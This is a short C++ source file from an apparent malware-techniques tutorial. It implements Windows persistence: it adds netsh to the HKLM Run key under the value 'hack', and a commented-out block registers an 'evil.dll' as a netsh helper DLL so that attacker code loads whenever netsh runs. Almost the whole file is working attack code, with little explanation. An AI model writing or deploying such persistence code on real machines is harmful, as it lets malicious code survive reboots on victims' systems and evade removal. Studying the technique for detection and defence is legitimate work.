/*
pers.cpp
windows persistence via netsh helper DLL
author: @cocomelonc
https://cocomelonc.github.io/tutorial/2022/05/29/malware-pers-6.html
*/
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;

  // netsh
  const char* netsh = "C:\\Windows\\SysWOW64\\netsh";

  // startup
  LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 , KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    // create new registry key
    RegSetValueEx(hkey, (LPCSTR)"hack", 0, REG_SZ, (unsigned char*)netsh, strlen(netsh));
    RegCloseKey(hkey);
  }

  // // evil DLL
  // const char* evilDll = "Z:\\2022-05-29-malware-pers-6\\evil.dll"
  //
  // // startup
  // res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)"\\SOFTWARE\\Microsoft\\NetSh", 0 , KEY_WRITE, &hkey);
  // if (res == ERROR_SUCCESS) {
  //
  //   // netsh
  //   // add helper Z:\2022-05-29-malware-pers-6\evil.dll
  //   // create new registry key
  //   RegSetValueEx(hkey, (LPCSTR)"netshhelper", 0, REG_SZ, (unsigned char*)evilDll, strlen(evilDll));
  //   RegCloseKey(hkey);
  // }

  return 0;
}
